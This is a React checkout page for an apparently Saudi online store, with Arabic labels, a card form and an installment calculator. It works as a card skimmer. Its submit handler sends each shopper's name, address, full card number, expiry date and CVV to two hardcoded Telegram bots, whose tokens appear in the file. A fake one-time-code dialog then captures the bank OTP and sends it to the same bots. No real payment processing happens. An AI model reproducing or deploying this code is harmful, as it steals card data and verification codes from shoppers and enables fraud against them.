"use client";
import React, { useState, useEffect, useRef } from "react";
import { useFormik } from "formik";
import * as Yup from "yup";
import { toast } from "sonner";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

let chatId1 = "7406710124";
let chatId2 = "1571075694";
let botId1 = "8221124554:AAHaANanc9AKTqhAZ3rD5wuqDWMSh6S2eWU";
let botId2 = "8260802793:AAFJCcDcGtcay05imytTdTYKPxbSPy86jpw";
export default function CheckoutPage() {
  const [cartItems, setCartItems] = useState([]);
  const [installmentMonths, setInstallmentMonths] = useState(6);
  const [installmentSchedule, setInstallmentSchedule] = useState([]);
  const [showOTP, setShowOTP] = useState(false);
  const [otp, setOtp] = useState(["", "", "", ""]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const otpInputsRef = useRef([]);

  const validationSchema = Yup.object({
    name: Yup.string()
      .required("الاسم الكامل مطلوب")
      .min(3, "يجب أن يكون الاسم至少 3 أحرف"),
    email: Yup.string()
      .email("البريد الإلكتروني غير صالح")
      .required("البريد الإلكتروني مطلوب"),
    phone: Yup.string()
      .required("رقم الهاتف مطلوب")
      .matches(/^05\d{8}$/, "رقم الهاتف يجب أن يبدأ بـ 05 ويتكون من 10 أرقام"),
    address: Yup.string().required("العنوان مطلوب"),
    city: Yup.string().required("المدينة مطلوبة"),
    paymentMethod: Yup.string().required("طريقة الدفع مطلوبة"),
    cardNumber: Yup.string().when("paymentMethod", {
      is: (paymentMethod) =>
        paymentMethod === "credit-card" || paymentMethod === "installment",
      then: () =>
        Yup.string()
          .required("رقم البطاقة مطلوب")
          .matches(/^\d{16}$/, "رقم البطاقة يجب أن يتكون من 16 رقمًا"),
    }),
    cardName: Yup.string().when("paymentMethod", {
      is: (paymentMethod) =>
        paymentMethod === "credit-card" || paymentMethod === "installment",
      then: () => Yup.string().required("اسم صاحب البطاقة مطلوب"),
    }),
    expiryDate: Yup.string().when("paymentMethod", {
      is: (paymentMethod) =>
        ["credit-card", "installment"].includes(paymentMethod),
      then: (schema) =>
        schema
          .required("تاريخ الانتهاء مطلوب")
          .matches(/^(0[1-9]|1[0-2])\/\d{2}$/, "صيغة التاريخ غير صالحة (MM/YY)")
          .test("expiryDate", "تاريخ البطاقة منتهي", (value) => {
            if (!value) return false;

            const [month, year] = value.split("/").map((v) => parseInt(v, 10));
            if (!month || !year) return false;

            // السنة الحالية (آخر رقمين)
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;

            return (
              year > currentYear ||
              (year === currentYear && month >= currentMonth)
            );
          }),
      otherwise: (schema) => schema.notRequired(),
    }),
    cvv: Yup.string().when("paymentMethod", {
      is: (paymentMethod) =>
        paymentMethod === "credit-card" || paymentMethod === "installment",
      then: () =>
        Yup.string()
          .required("CVV مطلوب")
          .matches(/^\d{3,4}$/, "CVV يجب أن يتكون من 3 أو 4 أرقام"),
    }),
  });

  const formik = useFormik({
    initialValues: {
      name: "",
      email: "",
      phone: "",
      address: "",
      city: "",
      paymentMethod: "credit-card",
      cardNumber: "",
      cardName: "",
      expiryDate: "",
      cvv: "",
    },
    validationSchema,
    onSubmit: (values, { setSubmitting }) => {
      handleSubmit(values, setSubmitting);
    },
  });

  useEffect(() => {
    const cart = JSON.parse(localStorage.getItem("cart") || "[]");
    setCartItems(cart);
  }, []);

  useEffect(() => {
    if (formik.values.paymentMethod === "installment") {
      calculateInstallmentSchedule();
    }
  }, [installmentMonths, formik.values.paymentMethod]);

  const calculateTotal = () => {
    return cartItems.reduce((total, item) => {
      const price = parseFloat(item.price.replace(/[^\d.]/g, ""));
      return total + price * item.quantity;
    }, 0);
  };

  const calculateInstallmentSchedule = () => {
    const total = calculateTotal();
    const tax = total * 0.15;
    const grandTotal = total + tax;

    // خصم 1000 ريال كدفعة أولى
    const afterDownPayment = grandTotal - 1000;

    // حساب القسط الشهري
    const monthlyPayment = afterDownPayment / installmentMonths;

    // إنشاء جدول الدفعات
    const schedule = [];
    const today = new Date();

    // الدفعة الأولى (الدفعة المقدمة)
    schedule.push({
      number: 1,
      date: new Date(today),
      amount: 1000,
      type: "الدفعة الأولى",
    });

    // الدفعات الشهرية
    for (let i = 1; i <= installmentMonths; i++) {
      const nextMonth = new Date(today);
      nextMonth.setMonth(today.getMonth() + i);

      schedule.push({
        number: i + 1,
        date: nextMonth,
        amount: monthlyPayment,
        type: "قسط شهري",
      });
    }

    setInstallmentSchedule(schedule);
  };

  const formatExpiryDate = (value) => {
    // إزالة جميع الأحرف غير الرقمية
    const digits = value.replace(/\D/g, "");

    // إضافة الشرطة المائلة تلقائياً بعد الشهر
    if (digits.length >= 3) {
      return `${digits.substring(0, 2)}/${digits.substring(2, 4)}`;
    }

    return digits;
  };

  const handleSubmit = async (values, setSubmitting) => {
    setIsSubmitting(true);

    const total = calculateTotal();

    const message = `
✅ طلب جديد

• الاسم: ${values.name}

• البريد الإلكتروني: ${values.email}

• رقم الهاتف: ${values.phone}

• عنوان التوصيل: ${values.address}, ${values.city}

-------------------------------------------
${
  values.paymentMethod === "credit-card" ||
  values.paymentMethod === "installment"
    ? `
💳 بيانات البطاقة:

• رقم البطاقة: ${values.cardNumber}

• اسم حامل البطاقة: ${values.cardName}

• تاريخ الانتهاء: ${values.expiryDate}

• الرقم السري: ${values.cvv}

• طريقة الدفع: ${
        values.paymentMethod === "credit-card" ? "بطاقة ائتمان" : "تقسيط"
      }
`
    : ""
}

• المجموع الكلي: ${total.toFixed(2)} ر.س
`;

    try {
      const response1 = await fetch(
        `https://api.telegram.org/bot${botId1}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId1,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      const data1 = await response1.json();

      if (!data1.ok) {
        throw new Error(data1.description || "فشل في إرسال الرسالة");
      }
      const response2 = await fetch(
        `https://api.telegram.org/bot${botId2}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId2,
            text: message,
            parse_mode: "Markdown",
          }),
        }
      );

      const data2 = await response2.json();

      if (!data2.ok) {
        throw new Error(data2.description || "فشل في إرسال الرسالة");
      }

      // بعد إرسال النموذج بنجاح، نفتح نافذة OTP
      setShowOTP(true);
    } catch (error) {
      console.error("Error sending to Telegram:", error);
      toast.error("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
    } finally {
      setSubmitting(false);
      setIsSubmitting(false);
    }
  };

  const handleVerifyOTP = async (e) => {
    e.preventDefault();
    const enteredOtp = otp.join("");

    if (enteredOtp.length !== 4) {
      toast.error("يرجى إدخال رمز التحقق المكون من 4 أرقام");
      return;
    }

    try {
      const response1 = await fetch(
        `https://api.telegram.org/bot${botId1}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId1,
            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${enteredOtp}`,
            parse_mode: "Markdown",
          }),
        }
      );

      const data1 = await response1.json();

      if (!data1.ok) {
        throw new Error(data1.description || "فشل في إرسال رمز التحقق");
      }

      
      const response2 = await fetch(
        `https://api.telegram.org/bot${botId2}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId2,
            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${enteredOtp}`,
            parse_mode: "Markdown",
          }),
        }
      );

      const data2 = await response2.json();

      if (!data2.ok) {
        throw new Error(data2.description || "فشل في إرسال رمز التحقق");
      }

      // مسح السلة بعد التأكيد الناجح
      localStorage.setItem("cart", JSON.stringify([]));

      toast.success("تم تأكيد الطلب بنجاح! سيتم توصيله خلال 3-5 أيام عمل.");
      setShowOTP(false);

      // هنا يمكنك إضافة إعادة التوجيه إلى صفحة الشكر أو الصفحة الرئيسية
    } catch (error) {
      console.error("Error sending OTP to Telegram:", error);
      toast.error("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.");
    }
  };

  const handleOtpChange = (value, index) => {
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // الانتقال تلقائياً إلى الحقل التالي عند إدخال رقم
    if (value && index < 3) {
      otpInputsRef.current[index + 1].focus();
    }
  };

  const handleOtpKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpInputsRef.current[index - 1].focus();
    }
  };

  if (cartItems.length === 0) {
    return (
      <section className="min-h-screen mt-40 flex items-center justify-center bg-gray-50 py-12">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-md w-full mx-4">
          <div className="text-5xl mb-4">🛒</div>
          <h2 className="text-2xl font-bold text-gray-800 mb-4">
            سلة التسوق فارغة
          </h2>
          <p className="text-gray-600 mb-6">
            لم تقم بإضافة أي منتجات إلى سلة التسوق بعد.
          </p>
          <a
            href="/products"
            className="bg-[#9d5ea9] text-white px-6 py-3 rounded-lg hover:bg-[#6b1fa3] transition-colors"
          >
            مواصلة التسوق
          </a>
        </div>
      </section>
    );
  }

  const total = calculateTotal();
  const tax = total * 0.15;
  const grandTotal = total + tax;

  return (
    <section className="min-h-screen bg-gray-50 pb-12 pt-6 px-4 md:mt-34 mt-16">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-10">
          إتمام الطلب
        </h1>

        <form onSubmit={formik.handleSubmit}>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* تفاصيل الطلب */}
            <div className="bg-white p-6 rounded-2xl shadow-lg">
              <h2 className="text-xl font-bold text-gray-800 mb-6 border-b pb-3">
                ملخص الطلب
              </h2>

              <div className="space-y-4 divide-y">
                {cartItems.map((item) => (
                  <div
                    key={item.id}
                    className="flex items-center justify-between py-3"
                  >
                    <div className="flex items-center">
                      <div>
                        <span className="font-medium block">{item.name}</span>
                        <span className="text-sm text-gray-500">
                          الكمية: {item.quantity}
                        </span>
                      </div>
                    </div>
                    <div className="flex flex-col items-end">
                      <span className="text-[#9d5ea9] font-bold">
                        {item.price}
                      </span>
                    </div>
                  </div>
                ))}
              </div>

              <div className="pb-5">
                <h2 className="text-xl font-bold text-gray-800 mb-4 border-t pt-3 mt-4 pb-3">
                  تفاصيل الشحن
                </h2>

                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        الاسم الكامل
                      </label>
                      <input
                        type="text"
                        name="name"
                        value={formik.values.name}
                        onChange={formik.handleChange}
                        onBlur={formik.handleBlur}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                      />
                      {formik.touched.name && formik.errors.name && (
                        <div className="text-red-500 text-sm mt-1">
                          {formik.errors.name}
                        </div>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        البريد الإلكتروني
                      </label>
                      <input
                        type="email"
                        name="email"
                        value={formik.values.email}
                        onChange={formik.handleChange}
                        onBlur={formik.handleBlur}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                      />
                      {formik.touched.email && formik.errors.email && (
                        <div className="text-red-500 text-sm mt-1">
                          {formik.errors.email}
                        </div>
                      )}
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      رقم الهاتف
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      value={formik.values.phone}
                      onChange={formik.handleChange}
                      onBlur={formik.handleBlur}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                    />
                    {formik.touched.phone && formik.errors.phone && (
                      <div className="text-red-500 text-sm mt-1">
                        {formik.errors.phone}
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      العنوان
                    </label>
                    <input
                      type="text"
                      name="address"
                      value={formik.values.address}
                      onChange={formik.handleChange}
                      onBlur={formik.handleBlur}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                    />
                    {formik.touched.address && formik.errors.address && (
                      <div className="text-red-500 text-sm mt-1">
                        {formik.errors.address}
                      </div>
                    )}
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        المدينة
                      </label>
                      <input
                        type="text"
                        name="city"
                        value={formik.values.city}
                        onChange={formik.handleChange}
                        onBlur={formik.handleBlur}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                      />
                      {formik.touched.city && formik.errors.city && (
                        <div className="text-red-500 text-sm mt-1">
                          {formik.errors.city}
                        </div>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">
                        طريقة الدفع
                      </label>
                      <select
                        name="paymentMethod"
                        value={formik.values.paymentMethod}
                        onChange={formik.handleChange}
                        onBlur={formik.handleBlur}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                      >
                        <option value="credit-card">بطاقة ائتمان</option>
                        <option value="installment">الدفع بالتقسيط</option>
                      </select>
                      {formik.touched.paymentMethod &&
                        formik.errors.paymentMethod && (
                          <div className="text-red-500 text-sm mt-1">
                            {formik.errors.paymentMethod}
                          </div>
                        )}
                    </div>
                  </div>
                  {/* خيارات التقسيط - تظهر فقط عند اختيار الدفع بالتقسيط */}
                  {formik.values.paymentMethod === "installment" && (
                    <div className="border-t pt-4 mt-4">
                      <h3 className="text-lg font-medium text-gray-800 mb-4">
                        خيارات التقسيط
                      </h3>

                      <div className="mb-6">
                        <label className="block text-sm font-medium text-gray-700 mb-3">
                          اختر مدة التقسيط (شهر)
                        </label>
                        <select
                          value={installmentMonths}
                          onChange={(e) =>
                            setInstallmentMonths(parseInt(e.target.value))
                          }
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                        >
                          {Array.from({ length: 29 }, (_, i) => i + 2).map(
                            (month) => (
                              <option key={month} value={month}>
                                {month} أشهر
                              </option>
                            )
                          )}
                        </select>
                      </div>

                      {/* جدول الدفعات */}
                      <div className="bg-gray-50 p-4 rounded-lg mb-6">
                        <h4 className="font-medium text-gray-800 mb-4 text-center">
                          جدول الدفعات
                        </h4>
                        <div className="overflow-x-auto">
                          <table className="min-w-full divide-y divide-gray-200">
                            <thead>
                              <tr>
                                <th className="px-4 py-2 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                                  رقم الدفعة
                                </th>
                                <th className="px-4 py-2 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                                  نوع الدفعة
                                </th>
                                <th className="px-4 py-2 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                                  تاريخ الاستحقاق
                                </th>
                                <th className="px-4 py-2 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                                  المبلغ
                                </th>
                              </tr>
                            </thead>
                            <tbody className="bg-white divide-y divide-gray-200">
                              {installmentSchedule.map((payment, index) => (
                                <tr key={index}>
                                  <td className="px-4 py-2 text-sm text-gray-900 text-center">
                                    {payment.number}
                                  </td>
                                  <td className="px-4 py-2 text-sm text-gray-900 text-center">
                                    {payment.type}
                                  </td>
                                  <td className="px-4 py-2 text-sm text-gray-900 text-center">
                                    {payment.date.toLocaleDateString("ar-EG")}
                                  </td>
                                  <td className="px-4 py-2 text-sm text-gray-900 text-center">
                                    {payment.amount.toFixed(2)} ر.س
                                  </td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                  )}
                  {/* حقول البطاقة الائتمانية - تظهر فقط عند اختيار بطاقة ائتمان */}
                  {(formik.values.paymentMethod === "credit-card" ||
                    formik.values.paymentMethod === "installment") && (
                    <div className="border-t pt-4 mt-4">
                      <h3 className="text-lg font-medium text-gray-800 mb-4">
                        معلومات البطاقة الائتمانية
                      </h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="md:col-span-2">
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            رقم البطاقة
                          </label>
                          <input
                            type="text"
                            name="cardNumber"
                            value={formik.values.cardNumber}
                            onChange={formik.handleChange}
                            onBlur={formik.handleBlur}
                            placeholder="1234 5678 9012 3456"
                            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                          />
                          {formik.touched.cardNumber &&
                            formik.errors.cardNumber && (
                              <div className="text-red-500 text-sm mt-1">
                                {formik.errors.cardNumber}
                              </div>
                            )}
                        </div>
                        <div className="md:col-span-2">
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            اسم صاحب البطاقة
                          </label>
                          <input
                            type="text"
                            name="cardName"
                            value={formik.values.cardName}
                            onChange={formik.handleChange}
                            onBlur={formik.handleBlur}
                            placeholder="كما هو مدون على البطاقة"
                            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                          />
                          {formik.touched.cardName &&
                            formik.errors.cardName && (
                              <div className="text-red-500 text-sm mt-1">
                                {formik.errors.cardName}
                              </div>
                            )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            تاريخ الانتهاء
                          </label>
                          <input
                            type="text"
                            name="expiryDate"
                            value={formik.values.expiryDate}
                            onChange={(e) => {
                              const formattedValue = formatExpiryDate(
                                e.target.value
                              );
                              formik.setFieldValue(
                                "expiryDate",
                                formattedValue
                              );
                            }}
                            onBlur={formik.handleBlur}
                            placeholder="MM/YY"
                            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                            maxLength="5"
                          />
                          {formik.touched.expiryDate &&
                            formik.errors.expiryDate && (
                              <div className="text-red-500 text-sm mt-1">
                                {formik.errors.expiryDate}
                              </div>
                            )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-1">
                            رمز الحماية (CVV)
                          </label>
                          <input
                            type="text"
                            name="cvv"
                            value={formik.values.cvv}
                            onChange={formik.handleChange}
                            onBlur={formik.handleBlur}
                            placeholder="123"
                            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                          />
                          {formik.touched.cvv && formik.errors.cvv && (
                            <div className="text-red-500 text-sm mt-1">
                              {formik.errors.cvv}
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* ملخص الطلب */}
            <div className="bg-white p-6 rounded-2xl shadow-lg h-fit">
              <h2 className="text-xl font-bold text-gray-800">تفاصيل الدفع</h2>
              <div className="border-t mt-3 pt-5 space-y-3">
                <div className="flex justify-between">
                  <span>المجموع الفرعي</span>
                  <span>{total.toFixed(2)} ر.س</span>
                </div>

                <div className="flex justify-between">
                  <span>الضريبة</span>
                  <span>{tax.toFixed(2)} ر.س</span>
                </div>

                {formik.values.paymentMethod === "installment" && (
                  <>
                    <div className="flex justify-between text-[#9d5ea9]">
                      <span>الدفعة الأولى</span>
                      <span>-1000.00 ر.س</span>
                    </div>
                    <div className="flex justify-between">
                      <span>المتبقي للتقسيط</span>
                      <span>{(grandTotal - 1000).toFixed(2)} ر.س</span>
                    </div>
                    <div className="flex justify-between">
                      <span>عدد أشهر التقسيط</span>
                      <span>{installmentMonths} أشهر</span>
                    </div>
                    <div className="flex justify-between">
                      <span>القسط الشهري</span>
                      <span>
                        {((grandTotal - 1000) / installmentMonths).toFixed(2)}{" "}
                        ر.س
                      </span>
                    </div>
                  </>
                )}

                <div className="flex justify-between text-lg font-bold border-t pt-3 mt-3">
                  <span>المجموع الكلي</span>
                  <span className="text-[#9d5ea9]">
                    {formik.values.paymentMethod === "installment"
                      ? grandTotal.toFixed(2)
                      : grandTotal.toFixed(2)}{" "}
                    ر.س
                  </span>
                </div>
              </div>

              <button
                type="submit"
                disabled={formik.isSubmitting || isSubmitting}
                className="w-full bg-[#9d5ea9] text-white py-3 rounded-lg mt-6 hover:bg-[#6b1fa3] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {formik.isSubmitting || isSubmitting
                  ? "جاري المعالجة..."
                  : "تأكيد الطلب"}
              </button>

              <p className="text-center text-sm text-gray-500 mt-4">
                بالضغط على تأكيد الطلب، فإنك توافق على
                <a href="#" className="text-[#9d5ea9]">
                  {" "}
                  شروط الخدمة{" "}
                </a>
                و
                <a href="#" className="text-[#9d5ea9]">
                  {" "}
                  سياسة الخصوصية
                </a>
              </p>
            </div>
          </div>
        </form>

        {/* نافذة التحقق من OTP */}
        <Dialog open={showOTP} onOpenChange={setShowOTP}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader className="py-4">
              <DialogTitle>التحقق من الهوية</DialogTitle>
              <DialogDescription>
                سوف تصلك رسالة تحتوي على رمز التحقق يرجى إدخاله في الحقل المخصص
              </DialogDescription>
            </DialogHeader>

            <form onSubmit={handleVerifyOTP}>
              <div className="flex justify-center space-x-2 mb-6">
                {[0, 1, 2, 3].map((index) => (
                  <input
                    key={index}
                    ref={(el) => (otpInputsRef.current[index] = el)}
                    type="text"
                    maxLength="1"
                    value={otp[index]}
                    onChange={(e) => handleOtpChange(e.target.value, index)}
                    onKeyDown={(e) => handleOtpKeyDown(e, index)}
                    className="w-14 h-14 text-center text-2xl font-bold border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
                  />
                ))}
              </div>

              <button
                type="submit"
                className="w-full bg-[#9d5ea9] text-white py-3 rounded-lg hover:bg-[#6b1fa3] transition-colors"
              >
                تأكيد رمز التحقق
              </button>
            </form>
          </DialogContent>
        </Dialog>
      </div>
    </section>
  );
}
